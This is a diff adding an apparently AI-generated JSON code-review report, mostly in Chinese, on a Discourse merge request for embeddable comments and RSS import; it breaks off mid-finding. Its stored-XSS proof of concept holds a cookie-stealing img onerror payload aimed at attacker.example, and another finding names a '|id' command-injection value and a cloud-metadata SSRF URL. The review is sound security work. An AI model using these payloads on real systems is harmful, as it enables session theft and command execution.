@@ -1,0 +1,448 @@
+{
+  "meta": {
+    "skill_version": "2026.08.02.05",
+    "reviewed_at": "2026-08-03T09:48:00+00:00",
+    "round": 1,
+    "mode": "local_branch",
+    "target": "discourse-graphite-4 @ 4f8aed2 「FEATURE: Embeddable Discourse comments, now with simple-rss instead of feedzirra」，base 為 62db063（Revert \"Support for Embeddable Comments via IFRAME\"）",
+    "phi_trigger": {
+      "triggered": false,
+      "evidence": [],
+      "note": "本次變更的資料路徑是 RSS/HTML 文章內容、topic/post 記錄與 site settings（app/models/topic_embed.rb、app/jobs/scheduled/poll_feed.rb、config/site_settings.yml:353-357），全部是公開論壇內容，沒有病歷號、身分識別或臨床資料。因此 PHI 相關的嚴重度升級規則（批次原子性升 Critical、blast radius 需列 PHI 成本）本次不適用。"
+    },
+    "process_directed_text": {
+      "detected": false,
+      "evidence": [],
+      "note": "已逐一檢查 commit message、程式碼註解（app/models/post.rb:131-132、lib/topic_retriever.rb:24-25、app/jobs/scheduled/poll_feed.rb:1-3）、i18n 字串（config/locales/server.en.yml:32-38）與 site setting 說明文字（config/locales/server.en.yml:768-771），沒有任何指向審查流程本身的文字。"
+    },
+    "blind_pass": false
+  },
+  "mr": null,
+  "intent_check": {
+    "should_do": {
+      "verdict": "ok",
+      "note": "base commit 62db063 正是把上一版「依賴 Curl 的 embeddable comments」revert 掉，本 MR 改用 simple-rss 與 ruby-readability 重做，是那次 revert 明確指向的下一步。功能本身（外站嵌入留言 + RSS/Atom 匯入）是清楚的產品需求。"
+    },
+    "right_mr": {
+      "verdict": "doubt",
+      "note": "三處與 embedding 功能無關的變動混在同一個 MR 裡：(1) lib/tasks/disqus.thor 被改寫成走 TopicEmbed.import_remote 並刪掉 --category 選項（見 F-005）；(2) db/migrate/20131223171005_create_top_topics.rb 這支已經合併的 migration 被加上 force: true（見 F-004）；(3) db/migrate/20131210181901_migrate_word_counts.rb 只有刪行尾空白與刪檔尾換行的純格式變動（見 F-016）。建議把這三處拆成獨立 MR，本 MR 只留 embedding + feed import。"
+    },
+    "right_timing": {
+      "verdict": "ok",
+      "note": "上一版實作剛被 revert，趁相關 context 還新鮮把不依賴 Curl 的版本補回來，時機合理。"
+    }
+  },
+  "scans": [
+    {
+      "tool": "trivy",
+      "status": "skipped",
+      "skipped_reason": "trivy 未安裝（preflight 確認不在 PATH），相依套件漏洞、misconfiguration 與 secret 掃描全部未執行。本 MR 新增 ruby-readability 0.5.7、simple-rss 1.3.1、guess_html_encoding 0.0.9 三個 gem（Gemfile_rails4.lock），沒有經過任何漏洞掃描。"
+    },
+    {
+      "tool": "opengrep",
+      "status": "skipped",
+      "skipped_reason": "opengrep 未安裝，且 $NCR_OPENGREP_RULES 指向的規則目錄與預設的「使用者家目錄下 semgrep-rules」兩者都不存在。SAST 未執行，diff 內的 .js / .erb / .yml 都沒有 SAST 覆蓋。"
+    },
+    {
+      "tool": "ruff",
+      "status": "skipped",
+      "exit_code": 0,
+      "skipped_reason": "ruff 有安裝（0.15.8）並實際執行過，但本 repo 有 0 個 Python 檔案，ruff 回報 No Python files found（exit 0，輸出空陣列）。diff 也未包含 .py。Ruby / ERB / SCSS / JS 不在 ruff 的覆蓋範圍內，所以這個 exit 0 不代表本次變更通過任何靜態檢查。"
+    },
+    {
+      "tool": "ty",
+      "status": "skipped",
+      "skipped_reason": "ty 未安裝，且本 repo 沒有 Python 檔案可檢查；Python 型別檢查未執行。"
+    },
+    {
+      "tool": "oxlint",
+      "status": "skipped",
+      "skipped_reason": "oxlint 未安裝。本 MR 新增 app/assets/javascripts/embed.js（27 行）以及兩份帶 inline <script> 的 ERB（app/views/layouts/embed.html.erb、app/views/embed/loading.html.erb），這些 JavaScript 完全沒有 lint 覆蓋。F-006 與 F-018 是人工閱讀找到的，不是工具找到的。"
+    },
+    {
+      "tool": "Ruby 工具鏈（rubocop / rspec / bundler）",
+      "status": "skipped",
+      "skipped_reason": "這個 repo 主體是 Ruby，但執行環境沒有任何 Ruby linter（rubocop 不在 PATH），也沒有安裝任何 gem、沒有對外網路，因此 bundle install / bundle exec rspec 都無法執行。本次審查完全沒有動態驗證：沒有跑過 spec、沒有跑過 migration、沒有啟動過應用程式。所有結論都來自靜態閱讀，唯一實際執行的是 ruby 3.3.6 對 ERB 產生碼的語法檢查（見 F-011）。"
+    },
+    {
+      "tool": "codegraph",
+      "status": "skipped",
+      "skipped_reason": "codegraph 未安裝，Phase 3 的呼叫路徑列舉改用 grep 完成：Post#cook、PostRevisor#revise!、PostCreator#setup_post、TopicEmbed.import、Jobs::PollFeed#feed_key 的呼叫端都以 grep 逐一列出並確認。代價是第二、三跳的傳遞影響只能靠人工追。"
+    },
+    {
+      "tool": "ncr-fresh-eyes（subagent）",
+      "status": "skipped",
+      "skipped_reason": "這個執行環境沒有任何可派送 subagent 的工具（Agent / Task 工具不存在，ToolSearch 以 select 與關鍵字兩種方式都查不到）。依 skill 規定不由主 agent 自行模擬，因此 Phase 3 步驟 1 未執行；本報告所有 finding 都來自 dimension checklist 與人工閱讀，少了一次未被 checklist 框住的觀察。"
+    },
+    {
+      "tool": "ncr-quality-check（subagent）",
+      "status": "skipped",
+      "skipped_reason": "同上，環境無法派送 subagent，Phase 4 步驟 3 的獨立品質檢查未執行。報告只經過 report_model.py 的結構驗證，沒有第二個 agent 檢查過措辭、嚴重度校準與 fix 的可行性。"
+    }
+  ],
+  "dimensions": {
+    "A": {
+      "verdict": "fail",
+      "note": "F-011（best.html.erb 多出來的 if，靠 Erubis 的編碼細節才沒炸）、F-015（require_dependency 用在 gem 上、未使用的 require_dependency 'email/sender'）、F-016（四個新檔案缺檔尾換行，外加一支無關 migration 的純空白變動）。命名與函式長度沒有問題：TopicEmbed.import 42 行但流程單一，TopicRetriever 的私有方法名稱都與行為相符。"
+    },
+    "B": {
+      "verdict": "fail",
+      "note": "F-013（TopicEmbed.import 就地修改傳入的 contents，是 B-5 的隱性副作用）、F-014（Jobs::PollFeed#feed_key 定義後從未被呼叫，是 B-4 的 dead code）。沒有發現重複邏輯或過度設計。"
+    },
+    "C": {
+      "verdict": "fail",
+      "note": "F-002 是 Critical：raw_html cook method 讓 RSS feed 的 HTML 完整繞過 PrettyText 的 sanitize，而同一支 model 的 import_remote 路徑卻有白名單，兩條路徑的防護不對稱。另有 F-006（embed.js 的 origin 用子字串比對）、F-008（open-uri 的 Kernel#open 直接吃 site setting 字串）、F-012（X-Frame-Options 用非標準值 ALLOWALL）。"
+    },
+    "D": {
+      "verdict": "fail",
+      "note": "F-003 是 Critical：GET embed/best 會建立 topic 與 post，違反 RFC 9110 的 GET 安全性語意。路由本身的命名符合慣例（embed/best 全小寫、無底線，config/routes.rb:245）；params.require(:embed_url) 提供了最基本的必填檢查，但沒有 URL 格式驗證（實際的 host 檢查在 TopicRetriever#invalid_host? 才做）。"
+    },
+    "E": {
+      "verdict": "fail",
+      "note": "F-009：Jobs::PollFeed#poll_feed 的 items 迴圈對遠端資料沒有任何 nil 防護或 rescue，配上 sidekiq_options retry: false，單一則壞掉的 item 會讓整輪 polling 靜默停擺。分層本身合理：controller 薄、TopicRetriever 負責節流與路由、TopicEmbed 負責匯入，職責切得乾淨。"
+    },
+    "F": {
+      "verdict": "fail",
+      "note": "F-004（force: true 被加到一支已經合併的 migration 上，是資料遺失的地雷）、F-010（TopicEmbed.import 的 check-then-create 沒有處理 unique index 衝突，兩個並行的匯入會讓其中一個整批 rollback）。新表的欄位型別、not null 與 unique index 設計本身是對的。"
+    },
+    "G": {
+      "verdict": "fail",
+      "note": "F-007：spec/jobs/poll_feed_spec.rb 的兩個測試沒有 stub 前置條件，就算把受測的判斷整段刪掉也照樣通過（G-3 的變形：測到的是 stub 而不是程式碼）。更關鍵的是 poll_feed 本體、TopicEmbed.import_remote、absolutize_urls 的相對 URL 轉換都沒有被實際執行過，F-002 與 F-009 這兩個問題現有測試都攔不到。embed_controller_spec 與 topic_retriever_spec 的品質可以，有斷到實際行為。"
+    },
+    "H": {
+      "verdict": "fail",
+      "note": "F-001 是 Critical：新增的 embed.css.scss 與 embed.js 都沒有進 config.assets.precompile，production 取不到資產。另有 F-017（三支 lockfile 只更新了一支）、F-018（embed.js 對宿主頁面的兩個隱性假設）。渲染狀態的完整度是好的：loading 與 empty 兩個狀態都有畫面（app/views/embed/loading.html.erb、app/views/embed/best.html.erb:2-6），只有 error 狀態沒有專屬畫面（走 Discourse::InvalidAccess 的預設處理）。"
+    },
+    "I": {
+      "verdict": "fail",
+      "note": "F-005：lib/tasks/disqus.thor 的 --category 選項與 created_at 傳遞被刪掉，既有使用者的指令會直接失效。其餘被修改的既有函式都確認過相容：Post#cook 加了早退但簽章不變，既有 post 因 migration 的 default: 1 落在 regular 分支（db/migrate/20131219203905_add_cook_method_to_posts.rb:3、lib/enum.rb:14 的 start 預設為 1）；PostRevisor#revise_post 的 @post.save 改成帶 validate 參數，既有呼叫端不傳 skip_validations 時 validate 仍為 true；PostCreator#setup_post 只是新增一行，且在 create 的第 58 行被呼叫，早於 before_create_tasks 的 post.cook（lib/post_creator.rb:105），cook_method 設定順序正確。"
+    }
+  },
+  "findings": [
+    {
+      "id": "F-001",
+      "dimension": "H",
+      "severity": "Critical",
+      "status": "new",
+      "title": "embed.css 與 embed.js 沒有加入 config.assets.precompile，production 會取不到這兩個資產",
+      "evidence": [
+        "app/views/layouts/embed.html.erb:4",
+        "app/assets/stylesheets/embed.css.scss:1",
+        "app/assets/javascripts/embed.js:1",
+        "config/application.rb:61",
+        "config/environments/production.rb:23"
+      ],
+      "rationale": "config/application.rb:61 明列了每一支需要 precompile 的頂層資產：vendor.js、common.css、desktop.css、mobile.css、admin.js、admin.css、shiny/shiny.css、preload_store.js、browser-update.js。本 MR 新增的 embed.css.scss 與 embed.js 都不在裡面。config/application.rb:57-59 的 lambda 只涵蓋 assets/images 且明確排除 .js 與 .css，Rails 4 的內建預設也只涵蓋 application.css / application.js 與非 js/css 檔，所以 rake assets:precompile 不會產出 embed 這兩支。production 環境 config/environments/production.rb:23 設定 config.assets.compile = false、:26 設定 digest = true，於是 app/views/layouts/embed.html.erb:4 的 stylesheet_link_tag 'embed' 在 production 拿不到 manifest 條目——這正是這個功能唯一的使用者可見頁面。embed.js 是要給第三方站長以 <script src> 貼進自己頁面的檔案，同樣不會被產出，第三方站台會拿到 404。development 因為 assets.compile = true 會即時編譯，所以本機完全測不出來，這也是這個問題容易被漏掉的原因。",
+      "fix": "在 config/application.rb:61 的清單加上 'embed.css' 與 'embed.js'：config.assets.precompile += ['vendor.js', ..., 'browser-update.js', 'embed.css', 'embed.js']。加完後用 RAILS_ENV=production bundle exec rake assets:precompile 確認 public/assets 底下確實產出這兩支再合併。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-002",
+      "dimension": "C",
+      "severity": "Critical",
+      "status": "new",
+      "title": "RSS 匯入的 HTML 以 raw_html cook method 完整繞過 sanitize，成為 stored XSS",
+      "evidence": [
+        "app/jobs/scheduled/poll_feed.rb:35",
+        "app/jobs/scheduled/poll_feed.rb:36",
+        "app/models/topic_embed.rb:22",
+        "app/models/post.rb:133",
+        "lib/pretty_text.rb:134",
+        "app/views/embed/best.html.erb:19"
+      ],
+      "rationale": "app/models/post.rb:133 讓 cook_method 為 raw_html 的 post 直接 return raw，跳過 post_analyzer.cook → PrettyText.cook，而 lib/pretty_text.rb:134 的 context_opts[:sanitize] ||= true 才是整個系統開啟 HTML sanitize 的地方。也就是說 raw_html 這條路徑上，posts.cooked 就是未經處理的來源 HTML。\n\n兩條餵進 raw_html 的路徑防護並不對稱：app/models/topic_embed.rb:44-51 的 import_remote 走 Readability::Document 並帶了 tags / attributes 白名單（只允許 div p code pre h1 h2 h3 b em i strong a img 與 href src），是安全的；但 app/jobs/scheduled/poll_feed.rb:35-36 直接把 CGI.unescapeHTML(i.content.scrub) 交給 TopicEmbed.import，中間唯一經過的 absolutize_urls（app/models/topic_embed.rb:56-76）只是 Nokogiri fragment 的 parse + to_html，不移除任何節點或屬性。feed 端的 <script> 與 onerror= 會原封不動存進 posts.cooked。\n\n輸出端沒有第二道防線：app/views/embed/best.html.erb:19 用 raw post.cooked 直接輸出，Ember 端也是以 {{{cooked}}} 呈現，app/assets/javascripts/discourse/dialects/dialect.js:46 的 sanitize 只在 markdown 編譯路徑上、raw_html 根本不會經過。\n\n曝險確實被「admin 才能設定 feed_polling_url」這件事收斂，但 import_remote 已經做了白名單，代表作者知道這裡需要白名單，poll_feed 缺白名單看起來是遺漏而不是取捨；而且「admin 信任的 feed」在現實中常常是多人投稿的部落格，或是今天可信、明天被入侵的第三方網站。",
+      "fix": "在 app/jobs/scheduled/poll_feed.rb:35 把 feed content 過一次白名單再交給 TopicEmbed.import，例如用 repo 已有的 sanitize gem：content = Sanitize.clean(CGI.unescapeHTML(i.content.to_s.scrub), Sanitize::Config::RELAXED)，或直接沿用 import_remote 的那組 tags / attributes 白名單，讓兩條路徑用同一份設定。更穩健的做法是把白名單移進 TopicEmbed.import 本身，讓「任何走 raw_html 的內容」都必然經過它，而不是靠每個呼叫端自己記得。",
+      "source": "dimension",
+      "counter_evidence_checked": true,
+      "security": {
+        "poc": "1. 以 admin 身分把 site setting feed_polling_enabled 設為 true、feed_polling_url 指向自己控制的 feed、embed_by_username 設為任一使用者。\n2. 在該 feed 放一則 item：\n   <item><title>poc</title><link>http://attacker.example/poc</link>\n   <content:encoded><![CDATA[<img src=x onerror=\"new Image().src='http://attacker.example/steal?c='+encodeURIComponent(document.cookie)\">]]></content:encoded>\n   </item>\n3. 等 Jobs::PollFeed 的 hourly 排程跑完（或在 rails console 直接 Jobs::PollFeed.new.execute({})）。\n4. curl -s 'http://forum.example.com/t/poc/123.json' | grep onerror —— payload 原封不動出現在 cooked 欄位，證明它沒有經過任何 sanitize。\n5. 用瀏覽器開該 topic（或用 embed 端點 GET embed/best?embed_url=http%3A%2F%2Fattacker.example%2Fpoc），script 即在論壇 origin 下執行並把 cookie 送到 attacker.example。",
+        "blast_radius": "論壇 origin 下的 stored XSS，觸發對象是所有瀏覽該 topic 的使用者，包含 admin。攻擊者可竊取 session cookie、在同 origin 下讀出 CSRF token 後以受害者身分呼叫任何 API（包含建立新 admin 帳號、修改站台設定），等同完整接管論壇。payload 存在資料庫裡，每次頁面載入都會重放，清除需要逐則修 post。本次不涉及 PHI。",
+        "treatment": "Mitigate",
+        "fix_reference": "app/models/topic_embed.rb:46-48 已有的 Readability tags/attributes 白名單就是現成的參考設定"
+      }
+    },
+    {
+      "id": "F-003",
+      "dimension": "D",
+      "severity": "Critical",
+      "status": "new",
+      "title": "GET embed/best 會建立 topic 與 post，違反 GET 的安全性語意",
+      "evidence": [
+        "config/routes.rb:245",
+        "app/controllers/embed_controller.rb:15",
+        "app/jobs/regular/retrieve_topic.rb:14",
+        "lib/topic_retriever.rb:45",
+        "app/models/topic_embed.rb:22-28"
+      ],
+      "rationale": "config/routes.rb:245 註冊的是 get 'embed/best'。app/controllers/embed_controller.rb:15 在找不到既有 embed 時 Jobs.enqueue(:retrieve_topic, ...)，該 job（app/jobs/regular/retrieve_topic.rb:14）走 TopicRetriever#fetch_http（lib/topic_retriever.rb:45）→ TopicEmbed.import_remote → TopicEmbed.import，最終在 app/models/topic_embed.rb:22-28 建立一個 Topic、一個 Post 與一筆 topic_embeds。這是一個 GET 產生持久狀態變更，RFC 9110 對 GET 的 safe 定義明確排除這件事，而本團隊把「GET 帶副作用」列為 Critical，理由正是 retry、prefetcher 與 cache 都預設 GET 可以隨意重放。\n\n實務上的觸發面：瀏覽器 prefetch、外掛的連結預覽、企業郵件安全閘道的 URL 掃描、任何重試中的 proxy，只要打到這個 URL 就會在論壇裡憑空生出文章。\n\n現有的緩解確實存在，我逐條追過：ensure_embeddable 要求 referer host 等於 embeddable_host（app/controllers/embed_controller.rb:26）、TopicRetriever#invalid_host? 要求 embed_url 的 host 也等於 embeddable_host（lib/topic_retriever.rb:14）、retrieved_recently? 對同一個 embed_url 做 60 秒節流（lib/topic_retriever.rb:26-30）。所以副作用被限制在「embeddable host 上的 URL」這個範圍內，不是任意人可以塞任意內容。但 referer 是可以偽造的、也不是 trust boundary，而且範圍限制並不改變「GET 不該有副作用」這個契約問題——一個誤觸的 prefetch 仍然會在論壇建立一篇文章，且沒有任何幂等保證。",
+      "fix": "把「渲染」與「建立」拆開：GET embed/best 只負責查既有 topic 與回 loading 畫面，不 enqueue 任何東西；loading 畫面（app/views/embed/loading.html.erb）改成用 XHR 對一個新的 POST embed/topics 端點送一次請求來觸發 retrieval，再輪詢或重載。這樣 iframe 只發 GET、狀態變更由明確的 POST 承載，prefetch 與 cache 都不會誤觸。如果團隊評估後決定接受這個 GET（例如認為 embeddable_host + 60 秒節流已經足夠），也請在 EmbedController 上留一段註解寫明這是刻意的例外與其依據，讓下一個維護者不會照著改成別的端點。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-004",
+      "dimension": "F",
+      "severity": "Suggestion",
+      "status": "new",
+      "title": "force: true 被加到一支已經合併的 migration 上，重跑時會靜默刪掉 top_topics 全部資料",
+      "evidence": [
+        "db/migrate/20131223171005_create_top_topics.rb:3",
+        "db/migrate/20131217174004_create_topic_embeds.rb:3"
+      ],
+      "rationale": "create_table 的 force: true 語意是「如果表已存在就先 DROP TABLE 再建」。db/migrate/20131223171005_create_top_topics.rb 是一支已經進 master 的 migration（時間戳 20131223 甚至比本 MR 新增的兩支 20131217 / 20131219 還晚），本 MR 把它從 create_table :top_topics 改成 create_table :top_topics, force: true。任何人做 rake db:rollback 後再 migrate、或在既有資料庫上重跑這支 migration，top_topics 就會被整張刪掉且不會有任何警告——migration 的歷史應該是不可變的，這正是它可以被安全重放的前提。\n\n這個改動看起來是開發過程中為了讓本機資料庫通過而留下的暫時修補，跟 embedding 功能沒有關係。新表 db/migrate/20131217174004_create_topic_embeds.rb:3 同樣帶了 force: true，對一張全新的表毫無必要（它本來就不存在），只是把同一顆地雷複製進新程式碼。",
+      "fix": "db/migrate/20131223171005_create_top_topics.rb 恢復成 create_table :top_topics do |t|（把這支從本 MR 的 diff 移除）；db/migrate/20131217174004_create_topic_embeds.rb:3 也拿掉 force: true。如果現有資料庫真的處於需要重建 top_topics 的壞狀態，正確做法是另外新增一支 migration 明確處理，而不是改寫已發佈的那一支。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-005",
+      "dimension": "I",
+      "severity": "Suggestion",
+      "status": "new",
+      "title": "disqus.thor 的 --category 選項與 created_at 被刪掉，既有匯入指令會失效",
+      "evidence": [
+        "lib/tasks/disqus.thor:116",
+        "lib/tasks/disqus.thor:148",
+        "app/models/topic_embed.rb:44-51"
+      ],
+      "rationale": "lib/tasks/disqus.thor 原本以 PostCreator.new(user, title:, raw:, created_at: Date.parse(t[:created_at]), category: category_id) 建立 topic，本 MR 改成 post = TopicEmbed.import_remote(user, t[:link], title: t[:title])，同時刪掉 method_option :category 與整段 category_id 的解析。三個對既有使用者的破壞：\n\n1. 任何帶 -c / --category 的既有指令會被 Thor 當成未知選項，直接失效。\n2. created_at 不再傳遞，匯入的所有文章時間都會變成執行匯入的當下，Disqus export 裡的原始發文時間全部丟失，而且這是不可逆的。\n3. 從「用 XML 裡已有的 title / link 建 topic」變成「對每一個 link 發 HTTP 抓網頁再用 Readability 解析」，離線的 XML 匯入變成需要連得到原站；原站已經下線或改版的舊文章會整批匯不進來，而 import_remote 對 open(url) 的失敗沒有任何 rescue。\n\n我確認過 TopicEmbed.import_remote（app/models/topic_embed.rb:44-51）的 opts 只支援 :title，沒有 :category 也沒有 :created_at，diff 內也沒有其他地方把這兩個值補回來。",
+      "fix": "把 disqus.thor 的改動從本 MR 拆出去獨立處理。若確定要保留這個方向，至少把 method_option :category 加回來，並讓 TopicEmbed.import_remote / TopicEmbed.import 的 opts 支援 :category 與 :created_at 再往下傳給 PostCreator；同時對 open(url) 失敗的情況加 rescue，讓單一篇抓不到不會中斷整批匯入。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-006",
+      "dimension": "C",
+      "severity": "Suggestion",
+      "status": "new",
+      "title": "embed.js 的 postMessage origin 檢查用子字串比對，前綴相同的網域會通過",
+      "evidence": [
+        "app/assets/javascripts/embed.js:17",
+        "app/views/layouts/embed.html.erb:11"
+      ],
+      "rationale": "app/assets/javascripts/embed.js:17 的 discourseUrl.indexOf(e.origin) === -1 問的是「e.origin 是不是 discourseUrl 的子字串」，而不是「兩者是不是同一個 origin」。當 discourseUrl 是 'http://forum.example.com/' 時，來自 http://forum.example.co 的訊息會通過（它是前綴子字串，indexOf 回傳 0）。此外 e.origin 依規範永遠不含結尾斜線，而站長貼上的 discourseUrl 通常會帶斜線，兩邊的形狀本來就對不上，用子字串來掩蓋這個差異會讓比對意外變寬鬆。\n\n目前的實際影響有限：通過檢查後最多只能改 iframe 的高度（embed.js:20-22 只處理 discourse-resize）。但這支檔案是要交給第三方站長貼進他們自己頁面執行的程式碼，之後只要有人在這個 handler 裡多加一種 message type，這個寬鬆的 origin 比對就會變成真正的問題。",
+      "fix": "先把 discourseUrl 正規化成 origin 再做完全相等比較，例如在 IIFE 開頭算一次：var a = document.createElement('a'); a.href = discourseUrl; var discourseOrigin = a.protocol + '//' + a.host;，然後改成 if (e.origin !== discourseOrigin) { return; }。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-007",
+      "dimension": "G",
+      "severity": "Suggestion",
+      "status": "new",
+      "title": "poll_feed_spec 的兩個測試不會失敗：受測的判斷整段刪掉也照樣通過",
+      "evidence": [
+        "spec/jobs/poll_feed_spec.rb:18-21",
+        "spec/jobs/poll_feed_spec.rb:24-27",
+        "app/jobs/scheduled/poll_feed.rb:15-17",
+        "config/site_settings.yml:355"
+      ],
+      "rationale": "app/jobs/scheduled/poll_feed.rb:15-17 的守衛是三個條件的 &&，第一個就是 SiteSetting.feed_polling_enabled?。config/site_settings.yml:355 的預設值是 false，測試環境沒有覆寫。\n\n「requires feed_polling_url」這個測試只 stub 了 feed_polling_url 回 nil，沒有把 feed_polling_enabled? stub 成 true；於是短路在第一個條件就結束，poll_feed 本來就不會被呼叫。就算把 SiteSetting.feed_polling_url.present? 這個判斷從程式碼整段刪掉，測試仍然是綠的。「requires embed_by_username」完全同理。這是 G-3 的變形：測試驗證的是 stub 的預設值，不是程式碼的行為。\n\n更關鍵的是覆蓋範圍：整份 spec 都用 poller.expects(:poll_feed) 把 poll_feed 本體 stub 掉，所以 app/jobs/scheduled/poll_feed.rb:24-38 那段迴圈從來沒有被實際執行過，F-002（缺 sanitize）與 F-009（缺 nil 防護）在 CI 上都不會被攔到。TopicEmbed.import_remote 與 absolutize_urls 的相對 URL 轉換也同樣沒有測試。",
+      "fix": "兩個測試都先把非受測的條件 stub 成滿足狀態，只讓受測的那一項為空，例如：SiteSetting.stubs(:feed_polling_enabled?).returns(true); SiteSetting.stubs(:embed_by_username).returns('eviltrout'); SiteSetting.stubs(:feed_polling_url).returns(nil)。另外補一個真的執行 poll_feed 的測試：stub SimpleRSS.parse 回一組固定的 items（含一則沒有 content 的），斷言 TopicEmbed.import 收到的內容已經被 sanitize、且缺欄位的 item 不會中斷整輪。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-008",
+      "dimension": "C",
+      "severity": "Suggestion",
+      "status": "new",
+      "title": "open(SiteSetting.feed_polling_url) 讓一個 site setting 字串同時具備讀本機檔案與執行指令的能力",
+      "evidence": [
+        "app/jobs/scheduled/poll_feed.rb:7",
+        "app/jobs/scheduled/poll_feed.rb:29",
+        "config/site_settings.yml:356"
+      ],
+      "rationale": "app/jobs/scheduled/poll_feed.rb:7 require 'open-uri' 之後，第 29 行的 open 仍然是被擴充過的 Kernel#open：只有當字串看起來是 URI 時才走 HTTP，其餘情況會回退到原本的 Kernel#open 語意——以 | 開頭的字串會被當成 shell command 執行，其他字串會被當成本機檔案路徑開啟。feed_polling_url 是一個純字串 site setting（config/site_settings.yml:356），沒有任何 scheme 驗證或 validator。\n\n實際結果是：把 feed_polling_url 設成 |id 會在 sidekiq worker 上執行指令；設成一個本機檔案路徑會直接把該檔案內容當成 feed 讀進來（部署目錄下的 config/database.yml 之類）；設成 http://169.254.169.254/... 則是完全沒有防護的 SSRF（雲端 metadata 端點）。\n\n沒有把它列為 Critical 的理由是：site setting 只有 admin 能改，而 Discourse admin 本來就有其他等效能力（例如 site customization 可以塞任意 JS）。但把一個「填 URL」的設定欄位變成指令執行的入口，仍然是不必要的權限放大——一個誤植的值、或一次針對 admin 的社交工程，代價從「抓錯 feed」變成「worker 上執行任意指令」。",
+      "fix": "先驗證 scheme 再取用：uri = URI.parse(SiteSetting.feed_polling_url); raise unless uri.is_a?(URI::HTTP) || uri.is_a?(URI::HTTPS)，然後用 uri.open 或 Net::HTTP 取內容，不要用裸的 Kernel#open。同時給 feed_polling_url 這個 site setting 掛一個 URL validator（lib/validators/ 底下已有既有的 validator 可以參照），讓錯誤在設定當下就被擋掉而不是在 job 裡。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-009",
+      "dimension": "E",
+      "severity": "Suggestion",
+      "status": "new",
+      "title": "poll_feed 對遠端資料沒有 nil 防護也沒有 rescue，配上 retry: false 會靜默停擺",
+      "evidence": [
+        "app/jobs/scheduled/poll_feed.rb:12",
+        "app/jobs/scheduled/poll_feed.rb:31-37",
+        "app/jobs/scheduled/poll_feed.rb:35"
+      ],
+      "rationale": "app/jobs/scheduled/poll_feed.rb:35 直接對 i.content 呼叫 .scrub。i 的欄位來自遠端 feed，SimpleRSS 對 feed 沒有提供的 tag 會回傳 nil；RSS 2.0 的標準內文欄位是 <description>，content:encoded 是擴充。只要 feed 少了那個欄位，第一則 item 就會 NoMethodError: undefined method 'scrub' for nil。i.title（第 36 行）同樣沒有防護。\n\n迴圈內也沒有任何 rescue，所以單一則 item 的問題（缺欄位、URL 太長、內容觸發 PostCreator 的例外）會讓整輪 polling 從那一則之後全部停掉，後面的 item 一則都不會被匯入。再加上第 12 行的 sidekiq_options retry: false，這次失敗不會重試；hourly 排程下的表現就是「每小時安靜失敗一次」，站方看不到任何訊號，只會覺得 feed 匯入時好時壞。\n\n這條路徑目前完全沒有測試覆蓋（見 F-007），所以 CI 也不會提前發現。",
+      "fix": "對欄位取值加 fallback 與轉型：content = (i.content || i.description).to_s.scrub、title = i.title.to_s；並把單則 item 的處理包進 begin/rescue => e，rescue 時 Rails.logger.warn(\"PollFeed: skipping #{url}: #{e.message}\") 後 next，讓一則壞掉的資料不會讓整輪 polling 停擺。另外考慮讓外層的 open 失敗也被 rescue 並記錄，而不是讓整個 job 直接死掉。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-010",
+      "dimension": "F",
+      "severity": "Suggestion",
+      "status": "new",
+      "title": "TopicEmbed.import 的 check-then-create 沒有處理 unique index 衝突，並行匯入會整批 rollback",
+      "evidence": [
+        "app/models/topic_embed.rb:15",
+        "app/models/topic_embed.rb:20-30",
+        "db/migrate/20131217174004_create_topic_embeds.rb:11",
+        "lib/topic_retriever.rb:26-30",
+        "lib/topic_retriever.rb:41"
+      ],
+      "rationale": "app/models/topic_embed.rb:15 先讀 TopicEmbed.where(embed_url: url).first，第 20 行判斷 blank? 之後才在 transaction 裡 create!。db/migrate/20131217174004_create_topic_embeds.rb:11 對 embed_url 有 unique index，所以兩個並行的執行緒同時通過第 20 行時，後到的 create! 會拋 ActiveRecord::RecordNotUnique；因為它在 Topic.transaction 裡，剛剛建好的 Topic 與 Post 會一起被 rollback，例外再往上冒出 poll_feed 的迴圈（沒有 rescue，見 F-009），整輪 polling 就此中止。\n\n這不是理論上的競態。lib/topic_retriever.rb:41 讓每一個 perform_retrieve 都同步跑一整輪 Jobs::PollFeed.new.execute({})，而 lib/topic_retriever.rb:26-30 的 60 秒節流是以 embed_url 為 key，不是以 feed 為 key。兩個不同的新 URL 同時進來，就會有兩個 sidekiq worker 各自跑一輪完整的 feed 匯入、對同一批 item 搶著 create!。再加上 hourly 的排程本身，重疊的機會相當高。",
+      "fix": "讓寫入端自己容忍衝突，而不是靠先讀一次：把 create! 包成 begin ... rescue ActiveRecord::RecordNotUnique; embed = TopicEmbed.where(embed_url: url).first; retry-as-update; end，或用 PostgreSQL 的 advisory lock（$redis 之外，pg_advisory_xact_lock(hashtext(url))）序列化同一個 url 的匯入。最低限度也要在 poll_feed 的迴圈裡 rescue 掉，讓一次衝突不會中止整輪（與 F-009 的修法一致）。另外建議把 lib/topic_retriever.rb 的節流補一個以 feed 為 key 的鎖，避免多個 worker 同時跑整輪 polling。",
+      "source": "dimension",
+      "counter_evidence_checked": true
+    },
+    {
+      "id": "F-011",
+      "dimension": "A",
+      "severity": "Suggestion",
+      "status": "new",
+      "title": "best.html.erb 的 <%- end if %> 多了一個 if，靠 Erubis 的產碼細節才沒有變成 SyntaxError",
+      "evidence": [
+        "app/views/embed/best.html.erb:6"
+      ],
